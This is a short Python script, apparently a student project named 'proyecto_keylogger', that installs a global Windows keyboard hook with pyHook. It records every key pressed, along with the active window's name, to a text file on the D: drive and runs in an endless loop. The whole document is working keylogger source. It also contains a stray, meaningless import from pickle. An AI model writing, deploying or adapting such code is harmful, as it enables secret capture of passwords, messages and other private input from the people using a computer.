from pickle import TRUE
import pyHook, pythoncom, sys, logging, time, datetime

carpeta_destino = "D:\\proyecto_keylogger\\keylogger.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()